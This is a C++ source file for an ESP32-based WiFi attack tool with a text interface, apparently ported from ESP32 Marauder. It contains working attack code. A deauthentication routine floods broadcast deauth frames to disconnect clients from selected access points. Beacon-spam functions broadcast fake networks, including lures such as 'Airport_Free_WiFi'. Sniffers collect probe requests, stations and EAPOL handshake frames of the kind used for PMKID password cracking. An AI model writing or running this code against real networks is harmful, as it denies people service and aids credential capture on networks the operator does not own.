/**
 * ESP32 Marauder TUI - WiFi Attacks Implementation
 * 
 * Ported from ESP32 Marauder WiFiScan with minimal dependencies
 */

#include "WiFiAttacks.h"
#include "SerialTUI.h"
#include <esp_random.h>

// ============================================
// Frame Templates
// ============================================

// Deauthentication frame template
const uint8_t deauthFrame[26] = {
    0xC0, 0x00,                          // Frame Control (deauth)
    0x00, 0x00,                          // Duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // Destination (broadcast)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // Source (to be filled)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // BSSID (to be filled)
    0x00, 0x00,                          // Sequence
    0x07, 0x00                           // Reason code (class 3 frame)
};

// Beacon frame template  
const uint8_t beaconFrame[128] = {
    0x80, 0x00,                          // Frame Control (beacon)
    0x00, 0x00,                          // Duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // Destination (broadcast)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // Source (random)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // BSSID (same as source)
    0x00, 0x00,                          // Sequence
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // Timestamp
    0x64, 0x00,                          // Beacon interval
    0x01, 0x04,                          // Capability info
    0x00                                 // SSID tag
};

// Rick Roll SSIDs
const char* rickRollSSIDs[8] = {
    "01 Never gonna give you up",
    "02 Never gonna let you down",
    "03 Never gonna run around",
    "04 and desert you",
    "05 Never gonna make you cry",
    "06 Never gonna say goodbye",
    "07 Never gonna tell a lie",
    "08 and hurt you"
};

// Funny SSIDs
const char* funnySSIDs[12] = {
    "FBI Surveillance Van",
    "Pretty Fly for a WiFi",
    "Wu-Tang LAN",
    "Bill Wi the Science Fi",
    "The LAN Before Time",
    "Drop It Like Its Hotspot",
    "LAN Solo",
    "The Promised LAN",
    "Nacho WiFi",
    "Get Off My LAN",
    "Titanic Syncing",
    "Winternet is Coming"
};

// Character set for random SSID
const char ssidChars[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";

// Global callback context
static WiFiAttacks* _callbackInstance = nullptr;

WiFiAttacks wifiAttacks;

// ============================================
// Promiscuous Mode Callback
// ============================================

// WiFi promiscuous packet structure (from ESP-IDF)
typedef struct {
    unsigned frame_ctrl:16;
    unsigned duration_id:16;
    uint8_t addr1[6];  // receiver/destination
    uint8_t addr2[6];  // transmitter/source
    uint8_t addr3[6];  // BSSID
    unsigned sequence_ctrl:16;
    uint8_t addr4[6];  // optional
} __attribute__((packed)) wifi_ieee80211_mac_hdr_t;

typedef struct {
    wifi_ieee80211_mac_hdr_t hdr;
    uint8_t payload[0];
} __attribute__((packed)) wifi_ieee80211_packet_t;

// Static callback for promiscuous mode
static void promiscuousCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (_callbackInstance == nullptr) return;
    _callbackInstance->handlePacket(buf, type);
}

// ============================================
// WiFiAttacks Implementation
// ============================================

void WiFiAttacks::begin() {
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    esp_wifi_set_promiscuous(false);
    _mode = WiFiMode::IDLE;
    _channel = DEFAULT_CHANNEL;
    _callbackInstance = this;
    
    // Add some default SSIDs for beacon spam
    addSSID("FreeWiFi");
    addSSID("CoffeeShop_Guest");
    addSSID("Airport_Free_WiFi");
}

void WiFiAttacks::update() {
    if (_mode == WiFiMode::IDLE) return;
    
    uint32_t now = millis();
    
    // Handle channel hopping for sniffing modes
    if (_channelHop) {
        handleChannelHop();
    }
    
    switch (_mode) {
        case WiFiMode::ATTACK_DEAUTH:
            if (now - _lastUpdate > 100) {
                sendDeauthToAll();
                _lastUpdate = now;
            }
            break;
            
        case WiFiMode::ATTACK_BEACON_RANDOM:
            if (now - _lastUpdate > 100) {
                sendRandomBeacon();
                _lastUpdate = now;
            }
            break;
            
        case WiFiMode::ATTACK_BEACON_LIST:
        case WiFiMode::ATTACK_RICKROLL:
        case WiFiMode::ATTACK_FUNNY:
            if (now - _lastUpdate > 100) {
                sendListBeacon();
                _lastUpdate = now;
            }
            break;
            
        // Sniffing modes - packet handling is done in callback
        case WiFiMode::SNIFF_BEACON:
        case WiFiMode::SNIFF_PROBE:
        case WiFiMode::SNIFF_DEAUTH:
        case WiFiMode::SNIFF_PMKID:
        case WiFiMode::SNIFF_PWN:
        case WiFiMode::SNIFF_RAW:
        case WiFiMode::SCAN_STATION:
            // Status update
            if (now - _lastUpdate > 2000) {
                char buf[48];
                snprintf(buf, sizeof(buf), "Packets: %lu | Ch: %d", _packetCount, _hopChannel);
                tui.printStatus(buf);
                _lastUpdate = now;
            }
            break;
            
        default:
            break;
    }
}

void WiFiAttacks::stop() {
    stopPromiscuous();
    
    char buf[64];
    snprintf(buf, sizeof(buf), "Stopped. Packets: %lu", _packetCount);
    tui.printStatus(buf);
    
    _mode = WiFiMode::IDLE;
    _packetCount = 0;
}

// ============================================
// Promiscuous Mode Helpers
// ============================================

void WiFiAttacks::startPromiscuous(bool channelHop) {
    _channelHop = channelHop;
    _hopChannel = channelHop ? 1 : _channel;
    _lastHopTime = millis();
    
    // Set channel
    esp_wifi_set_channel(_hopChannel, WIFI_SECOND_CHAN_NONE);
    
    // Enable promiscuous mode
    esp_wifi_set_promiscuous_rx_cb(promiscuousCallback);
    esp_wifi_set_promiscuous(true);
}

void WiFiAttacks::stopPromiscuous() {
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(nullptr);
    _channelHop = false;
}

void WiFiAttacks::handleChannelHop() {
    uint32_t now = millis();
    if (now - _lastHopTime >= CHANNEL_HOP_INTERVAL) {
        _hopChannel = (_hopChannel % MAX_CHANNEL) + 1;
        esp_wifi_set_channel(_hopChannel, WIFI_SECOND_CHAN_NONE);
        _lastHopTime = now;
    }
}

// ============================================
// Packet Handler (called from promiscuous callback)
// ============================================

void WiFiAttacks::handlePacket(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (_mode == WiFiMode::IDLE) return;
    
    wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
    wifi_ieee80211_packet_t* ipkt = (wifi_ieee80211_packet_t*)pkt->payload;
    
    int len = pkt->rx_ctrl.sig_len;
    int rssi = pkt->rx_ctrl.rssi;
    
    // Only process management frames for most sniff modes
    uint8_t frameType = ipkt->hdr.frame_ctrl & 0x0C;
    uint8_t frameSubtype = ipkt->hdr.frame_ctrl & 0xF0;
    
    _packetCount++;
    
    switch (_mode) {
        case WiFiMode::SNIFF_BEACON:
            if (frameType == WIFI_FRAME_TYPE_MGMT && frameSubtype == WIFI_MGMT_BEACON) {
                parseBeaconFrame(pkt->payload, len, rssi);
            }
            break;
            
        case WiFiMode::SNIFF_PROBE:
            if (frameType == WIFI_FRAME_TYPE_MGMT && frameSubtype == WIFI_MGMT_PROBE_REQ) {
                parseProbeRequest(pkt->payload, len, rssi);
            }
            break;
            
        case WiFiMode::SNIFF_DEAUTH:
            if (frameType == WIFI_FRAME_TYPE_MGMT && 
                (frameSubtype == WIFI_MGMT_DEAUTH || frameSubtype == WIFI_MGMT_DISASSOC)) {
                parseDeauthFrame(pkt->payload, len, rssi);
            }
            break;
            
        case WiFiMode::SNIFF_PMKID:
            // EAPOL frames are data frames with specific patterns
            if (frameType == WIFI_FRAME_TYPE_DATA) {
                parseEAPOL(pkt->payload, len, rssi);
            }
            break;
            
        case WiFiMode::SNIFF_PWN:
            // Pwnagotchi sends beacons with special payload
            if (frameType == WIFI_FRAME_TYPE_MGMT && frameSubtype == WIFI_MGMT_BEACON) {
                parsePwnagotchi(pkt->payload, len, rssi);
            }
            break;
            
        case WiFiMode::SNIFF_RAW:
            // Just count all packets, with occasional type info
            if (_packetCount % 50 == 1) {
                char buf[48];
                const char* typeStr = "?";
                if (frameType == WIFI_FRAME_TYPE_MGMT) typeStr = "MGMT";
                else if (frameType == WIFI_FRAME_TYPE_CTRL) typeStr = "CTRL";
                else if (frameType == WIFI_FRAME_TYPE_DATA) typeStr = "DATA";
                snprintf(buf, sizeof(buf), "%s frame, %d bytes, %ddBm", typeStr, len, rssi);
                tui.printResult(buf);
            }
            break;
            
        case WiFiMode::SCAN_STATION:
            // Look for data frames to find stations
            if (frameType == WIFI_FRAME_TYPE_DATA) {
                // addr2 is the transmitter (could be station)
                addStation(ipkt->hdr.addr2, ipkt->hdr.addr3, rssi);
            }
            break;
            
        default:
            break;
    }
}

// ============================================
// Frame Parsing Functions
// ============================================

void WiFiAttacks::parseBeaconFrame(const uint8_t* payload, int len, int rssi) {
    if (len < 36) return;
    
    wifi_ieee80211_packet_t* pkt = (wifi_ieee80211_packet_t*)payload;
    
    // BSSID is in addr3
    uint8_t* bssid = pkt->hdr.addr3;
    
    // SSID starts at fixed offset after management frame header
    // Header (24) + Timestamp (8) + Beacon Interval (2) + Capability (2) = 36
    // Then comes tagged parameters, first one is usually SSID
    int pos = 24 + 8 + 2 + 2;  // 36
    
    if (pos >= len) return;
    
    uint8_t tagNum = payload[pos];
    uint8_t tagLen = payload[pos + 1];
    
    char ssid[33] = {0};
    if (tagNum == 0 && tagLen > 0 && tagLen <= 32 && pos + 2 + tagLen <= len) {
        memcpy(ssid, &payload[pos + 2], tagLen);
        ssid[tagLen] = '\0';
    } else {
        strcpy(ssid, "<hidden>");
    }
    
    char buf[64];
    snprintf(buf, sizeof(buf), "%s [%02X:%02X:%02X] %ddBm", 
             ssid, bssid[3], bssid[4], bssid[5], rssi);
    tui.printResult(buf);
}

void WiFiAttacks::parseProbeRequest(const uint8_t* payload, int len, int rssi) {
    if (len < 28) return;
    
    wifi_ieee80211_packet_t* pkt = (wifi_ieee80211_packet_t*)payload;
    
    // Source MAC (the station sending the probe)
    uint8_t* srcMac = pkt->hdr.addr2;
    
    // SSID is at offset 24 (after header)
    int pos = 24;
    
    char ssid[33] = {0};
    if (pos + 2 < len) {
        uint8_t tagNum = payload[pos];
        uint8_t tagLen = payload[pos + 1];
        
        if (tagNum == 0 && tagLen > 0 && tagLen <= 32 && pos + 2 + tagLen <= len) {
            memcpy(ssid, &payload[pos + 2], tagLen);
            ssid[tagLen] = '\0';
        } else if (tagLen == 0) {
            strcpy(ssid, "<broadcast>");
        }
    }
    
    char buf[64];
    snprintf(buf, sizeof(buf), "%02X:%02X:%02X probe: %s", 
             srcMac[3], srcMac[4], srcMac[5], ssid);
    tui.printResult(buf);
    
    // Also add as a station
    uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    addStation(srcMac, broadcast, rssi);
}

void WiFiAttacks::parseDeauthFrame(const uint8_t* payload, int len, int rssi) {
    if (len < 26) return;
    
    wifi_ieee80211_packet_t* pkt = (wifi_ieee80211_packet_t*)payload;
    
    // Source (the one sending deauth)
    uint8_t* srcMac = pkt->hdr.addr2;
    // Destination 
    uint8_t* dstMac = pkt->hdr.addr1;
    
    // Reason code at offset 24
    uint16_t reason = 0;
    if (len >= 26) {
        reason = payload[24] | (payload[25] << 8);
    }
    
    char buf[64];
    snprintf(buf, sizeof(buf), "DEAUTH: %02X:%02X:%02X -> %02X:%02X:%02X (r:%d)", 
             srcMac[3], srcMac[4], srcMac[5],
             dstMac[3], dstMac[4], dstMac[5],
             reason);
    tui.printResult(buf);
}

void WiFiAttacks::parseEAPOL(const uint8_t* payload, int len, int rssi) {
    // EAPOL frames have EtherType 0x888E
    // Look for this pattern in the data frame
    // This is a simplified check - full PMKID extraction is complex
    
    if (len < 100) return;
    
    // Look for 0x88 0x8E (EAPOL EtherType) anywhere in payload
    for (int i = 24; i < len - 10 && i < 60; i++) {
        if (payload[i] == 0x88 && payload[i + 1] == 0x8E) {
            wifi_ieee80211_packet_t* pkt = (wifi_ieee80211_packet_t*)payload;
            
            char buf[64];
            snprintf(buf, sizeof(buf), "EAPOL: %02X:%02X:%02X <-> %02X:%02X:%02X",
                     pkt->hdr.addr1[3], pkt->hdr.addr1[4], pkt->hdr.addr1[5],
                     pkt->hdr.addr2[3], pkt->hdr.addr2[4], pkt->hdr.addr2[5]);
            tui.printResult(buf);
            return;
        }
    }
}

void WiFiAttacks::parsePwnagotchi(const uint8_t* payload, int len, int rssi) {
    // Pwnagotchi beacons contain JSON in vendor-specific IEs
    // Look for "pwnd" or "identity" strings in the beacon
    
    if (len < 50) return;
    
    // Search for "pwn" pattern in payload
    for (int i = 36; i < len - 4; i++) {
        if ((payload[i] == 'p' && payload[i+1] == 'w' && payload[i+2] == 'n') ||
            (payload[i] == 'P' && payload[i+1] == 'W' && payload[i+2] == 'N')) {
            
            wifi_ieee80211_packet_t* pkt = (wifi_ieee80211_packet_t*)payload;
            
            // Try to extract SSID
            char ssid[33] = {0};
            int pos = 36;
            if (pos + 2 < len && payload[pos] == 0) {
                uint8_t ssidLen = payload[pos + 1];
                if (ssidLen <= 32 && pos + 2 + ssidLen <= len) {
                    memcpy(ssid, &payload[pos + 2], ssidLen);
                }
            }
            
            char buf[64];
            snprintf(buf, sizeof(buf), "PWNAGOTCHI: %s [%02X:%02X:%02X]",
                     ssid[0] ? ssid : "?",
                     pkt->hdr.addr3[3], pkt->hdr.addr3[4], pkt->hdr.addr3[5]);
            tui.printResult(buf);
            return;
        }
    }
}

bool WiFiAttacks::addStation(const uint8_t* mac, const uint8_t* bssid, int8_t rssi) {
    // Check if station already exists
    for (int i = 0; i < _stations.size(); i++) {
        Station s = _stations.get(i);
        if (memcmp(s.mac, mac, 6) == 0) {
            return false;  // Already exists
        }
    }
    
    // Check for broadcast/multicast MACs - skip them
    if (mac[0] & 0x01) return false;  // Multicast bit set
    
    // Check for null MAC
    bool isNull = true;
    for (int i = 0; i < 6; i++) {
        if (mac[i] != 0) { isNull = false; break; }
    }
    if (isNull) return false;
    
    // Add new station
    if (_stations.size() < MAX_STATIONS) {
        Station s;
        memcpy(s.mac, mac, 6);
        memcpy(s.bssid, bssid, 6);
        s.rssi = rssi;
        s.selected = false;
        _stations.add(s);
        
        char buf[48];
        snprintf(buf, sizeof(buf), "STA: %02X:%02X:%02X:%02X:%02X:%02X",
                 mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
        tui.printResult(buf);
        return true;
    }
    
    return false;
}

// ============================================
// Scanning Functions
// ============================================

void WiFiAttacks::startScanAP() {
    _mode = WiFiMode::SCAN_AP;
    _accessPoints.clear();
    
    tui.printStatus("Scanning for APs...");
    
    int n = WiFi.scanNetworks(false, true);
    
    for (int i = 0; i < n && i < MAX_APS; i++) {
        AccessPoint ap;
        ap.essid = WiFi.SSID(i);
        memcpy(ap.bssid, WiFi.BSSID(i), 6);
        ap.channel = WiFi.channel(i);
        ap.rssi = WiFi.RSSI(i);
        ap.selected = false;
        _accessPoints.add(ap);
        
        char buf[64];
        snprintf(buf, sizeof(buf), "[%d] %s (Ch:%d, %ddBm)", 
                 i, ap.essid.c_str(), ap.channel, ap.rssi);
        tui.printResult(buf);
    }
    
    char buf[32];
    snprintf(buf, sizeof(buf), "Found %d APs", n);
    tui.printStatus(buf);
    
    _mode = WiFiMode::IDLE;
}

void WiFiAttacks::startScanStation() {
    _mode = WiFiMode::SCAN_STATION;
    _packetCount = 0;
    _lastUpdate = millis();
    _stations.clear();
    
    tui.printStatus("Scanning for stations (channel hopping)...");
    startPromiscuous(true);  // Enable channel hopping
}

void WiFiAttacks::startSniffBeacon() {
    _mode = WiFiMode::SNIFF_BEACON;
    _packetCount = 0;
    _lastUpdate = millis();
    
    tui.printStatus("Sniffing beacons (channel hopping)...");
    startPromiscuous(true);
}

void WiFiAttacks::startSniffProbe() {
    _mode = WiFiMode::SNIFF_PROBE;
    _packetCount = 0;
    _lastUpdate = millis();
    
    tui.printStatus("Sniffing probe requests (channel hopping)...");
    startPromiscuous(true);
}

void WiFiAttacks::startSniffDeauth() {
    _mode = WiFiMode::SNIFF_DEAUTH;
    _packetCount = 0;
    _lastUpdate = millis();
    
    tui.printStatus("Sniffing deauth packets (channel hopping)...");
    startPromiscuous(true);
}

void WiFiAttacks::startSniffPMKID() {
    _mode = WiFiMode::SNIFF_PMKID;
    _packetCount = 0;
    _lastUpdate = millis();
    
    tui.printStatus("Capturing EAPOL frames (channel hopping)...");
    startPromiscuous(true);
}

void WiFiAttacks::startSniffPwn() {
    _mode = WiFiMode::SNIFF_PWN;
    _packetCount = 0;
    _lastUpdate = millis();
    
    tui.printStatus("Scanning for Pwnagotchi (channel hopping)...");
    startPromiscuous(true);
}

void WiFiAttacks::startSniffRaw() {
    _mode = WiFiMode::SNIFF_RAW;
    _packetCount = 0;
    _lastUpdate = millis();
    
    tui.printStatus("Raw packet capture (channel hopping)...");
    startPromiscuous(true);
}

// ============================================
// Attack Functions
// ============================================

void WiFiAttacks::startDeauth() {
    _mode = WiFiMode::ATTACK_DEAUTH;
    _packetCount = 0;
    _lastUpdate = millis();
    tui.printStatus("Deauth attack started (press any key to stop)...");
}

void WiFiAttacks::startBeaconRandom() {
    _mode = WiFiMode::ATTACK_BEACON_RANDOM;
    _packetCount = 0;
    _lastUpdate = millis();
    tui.printStatus("Random beacon spam started (press any key to stop)...");
}

void WiFiAttacks::startBeaconList() {
    _mode = WiFiMode::ATTACK_BEACON_LIST;
    _packetCount = 0;
    _lastUpdate = millis();
    tui.printStatus("Beacon list spam started (press any key to stop)...");
}

void WiFiAttacks::startRickRoll() {
    _mode = WiFiMode::ATTACK_RICKROLL;
    _packetCount = 0;
    _lastUpdate = millis();
    
    // Load Rick Roll SSIDs
    _ssids.clear();
    for (int i = 0; i < 8; i++) {
        SSID s;
        s.name = rickRollSSIDs[i];
        s.selected = true;
        _ssids.add(s);
    }
    
    tui.printStatus("Rick Roll beacon spam started!");
}

void WiFiAttacks::startFunnyBeacon() {
    _mode = WiFiMode::ATTACK_FUNNY;
    _packetCount = 0;
    _lastUpdate = millis();
    
    // Load funny SSIDs
    _ssids.clear();
    for (int i = 0; i < 12; i++) {
        SSID s;
        s.name = funnySSIDs[i];
        s.selected = true;
        _ssids.add(s);
    }
    
    tui.printStatus("Funny beacon spam started!");
}

// ============================================
// Frame Sending
// ============================================

void WiFiAttacks::sendDeauthToAll() {
    for (int i = 0; i < _accessPoints.size(); i++) {
        AccessPoint ap = _accessPoints.get(i);
        if (ap.selected) {
            // Send deauth to broadcast (all clients)
            uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
            sendDeauthFrame(ap.bssid, broadcast, ap.channel);
            _packetCount++;
        }
    }
}

void WiFiAttacks::sendDeauthFrame(const uint8_t* ap, const uint8_t* client, uint8_t channel) {
    uint8_t packet[26];
    memcpy(packet, deauthFrame, 26);
    
    // Set destination (client)
    memcpy(&packet[4], client, 6);
    // Set source (AP)
    memcpy(&packet[10], ap, 6);
    // Set BSSID (AP)
    memcpy(&packet[16], ap, 6);
    
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    esp_wifi_80211_tx(WIFI_IF_STA, packet, sizeof(packet), false);
}

void WiFiAttacks::sendRandomBeacon() {
    // Generate random SSID
    char ssid[32];
    int len = 8 + (esp_random() % 16);
    for (int i = 0; i < len; i++) {
        ssid[i] = ssidChars[esp_random() % (sizeof(ssidChars) - 1)];
    }
    ssid[len] = '\0';
    
    sendBeaconFrame(ssid, _channel);
    _packetCount++;
}

void WiFiAttacks::sendListBeacon() {
    static int idx = 0;
    
    if (_ssids.size() > 0) {
        SSID s = _ssids.get(idx);
        sendBeaconFrame(s.name.c_str(), _channel);
        _packetCount++;
        idx = (idx + 1) % _ssids.size();
    }
}

void WiFiAttacks::sendBeaconFrame(const char* ssid, uint8_t channel) {
    uint8_t packet[128];
    memcpy(packet, beaconFrame, 36);
    
    // Generate random source MAC
    for (int i = 0; i < 6; i++) {
        packet[10 + i] = esp_random() & 0xFF;
    }
    packet[10] |= 0x02;  // Local bit
    
    // Copy to BSSID
    memcpy(&packet[16], &packet[10], 6);
    
    // Add SSID
    int ssidLen = strlen(ssid);
    if (ssidLen > 32) ssidLen = 32;
    
    packet[36] = 0x00;  // SSID tag
    packet[37] = ssidLen;
    memcpy(&packet[38], ssid, ssidLen);
    
    // Supported rates tag
    int pos = 38 + ssidLen;
    packet[pos++] = 0x01;  // Supported rates tag
    packet[pos++] = 0x08;  // 8 rates
    packet[pos++] = 0x82; packet[pos++] = 0x84;
    packet[pos++] = 0x8b; packet[pos++] = 0x96;
    packet[pos++] = 0x24; packet[pos++] = 0x30;
    packet[pos++] = 0x48; packet[pos++] = 0x6c;
    
    // Channel tag
    packet[pos++] = 0x03;  // DS Parameter Set
    packet[pos++] = 0x01;  // Length
    packet[pos++] = channel;
    
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    esp_wifi_80211_tx(WIFI_IF_STA, packet, pos, false);
}

// ============================================
// Channel Management
// ============================================

void WiFiAttacks::setChannel(uint8_t channel) {
    if (channel >= 1 && channel <= MAX_CHANNEL) {
        _channel = channel;
        esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    }
}

// ============================================
// Target Management
// ============================================

void WiFiAttacks::selectAP(uint8_t index, bool selected) {
    if (index < _accessPoints.size()) {
        AccessPoint ap = _accessPoints.get(index);
        ap.selected = selected;
        _accessPoints.set(index, ap);
    }
}

void WiFiAttacks::addSSID(const char* ssid) {
    if (_ssids.size() < MAX_SSIDS) {
        SSID s;
        s.name = ssid;
        s.selected = true;
        _ssids.add(s);
    }
}

void WiFiAttacks::clearAll() {
    _accessPoints.clear();
    _stations.clear();
    _ssids.clear();
    tui.printStatus("All targets cleared");
}

// ============================================
// Helpers
// ============================================

String WiFiAttacks::macToString(const uint8_t* mac) {
    char buf[18];
    snprintf(buf, sizeof(buf), "%02X:%02X:%02X:%02X:%02X:%02X",
             mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
    return String(buf);
}